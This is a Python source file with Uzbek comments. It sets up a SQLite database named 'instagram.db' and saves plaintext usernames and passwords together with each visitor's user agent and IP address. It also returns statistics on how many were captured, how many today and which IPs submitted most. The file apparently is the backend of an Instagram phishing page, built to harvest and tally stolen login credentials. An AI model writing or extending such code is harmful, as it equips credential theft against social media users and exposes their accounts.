import sqlite3
from datetime import datetime
import logging
import os

logger = logging.getLogger(__name__)

def get_db_path():
    """Render uchun to'g'ri database path"""
    if 'RENDER' in os.environ:
        return '/tmp/instagram.db'
    return 'instagram.db'

def init_db():
    """Database va table yaratish"""
    try:
        db_path = get_db_path()
        logger.info(f"Database path: {db_path}")
        
        conn = sqlite3.connect(db_path)
        cursor = conn.cursor()
        
        cursor.execute('''
            CREATE TABLE IF NOT EXISTS logs (
                id INTEGER PRIMARY KEY AUTOINCREMENT,
                username TEXT NOT NULL,
                password TEXT NOT NULL,
                timestamp DATETIME DEFAULT CURRENT_TIMESTAMP,
                user_agent TEXT,
                ip_address TEXT
            )
        ''')
        
        conn.commit()
        conn.close()
        logger.info("Database initialized")
        return True
    except Exception as e:
        logger.error(f"Database init error: {e}")
        return False

def get_connection():
    """Database connection olish"""
    return sqlite3.connect(get_db_path())

def save_log(username, password, user_agent, ip_address):
    """Yangi log saqlash"""
    try:
        conn = get_connection()
        cursor = conn.cursor()
        cursor.execute('''
            INSERT INTO logs (username, password, user_agent, ip_address)
            VALUES (?, ?, ?, ?)
        ''', (username, password, user_agent, ip_address))
        conn.commit()
        conn.close()
        return True
    except Exception as e:
        logger.error(f"Save error: {e}")
        return False

def get_logs(limit=100):
    """Loglarni olish"""
    try:
        conn = get_connection()
        cursor = conn.cursor()
        cursor.execute('SELECT * FROM logs ORDER BY timestamp DESC LIMIT ?', (limit,))
        rows = cursor.fetchall()
        conn.close()
        return rows
    except Exception as e:
        logger.error(f"Get logs error: {e}")
        return []

def get_stats():
    """Statistika olish - 4 TA QIYMAT QAYTARISH KERAK!"""
    try:
        conn = get_connection()
        cursor = conn.cursor()
        
        # 1. Jami yozuvlar
        cursor.execute('SELECT COUNT(*) FROM logs')
        total = cursor.fetchone()[0]
        
        # 2. Bugungi yozuvlar
        cursor.execute('SELECT COUNT(*) FROM logs WHERE DATE(timestamp) = DATE("now")')
        today = cursor.fetchone()[0]
        
        # 3. Oxirgi yozuv vaqti
        cursor.execute('SELECT timestamp FROM logs ORDER BY timestamp DESC LIMIT 1')
        last_row = cursor.fetchone()
        last_time = last_row[0] if last_row else None
        
        # 4. Top IP (o'rniga None qaytaramiz yoki hisoblaymiz)
        cursor.execute('SELECT ip_address, COUNT(*) as cnt FROM logs GROUP BY ip_address ORDER BY cnt DESC LIMIT 1')
        top_ip_row = cursor.fetchone()
        top_ip = (top_ip_row[0], top_ip_row[1]) if top_ip_row else (None, 0)
        
        conn.close()
        
        # 4 TA QIYMAT QAYTARISH KERAK!
        return total, today, last_time, top_ip
    except Exception as e:
        logger.error(f"Stats error: {e}")
        return 0, 0, None, (None, 0)
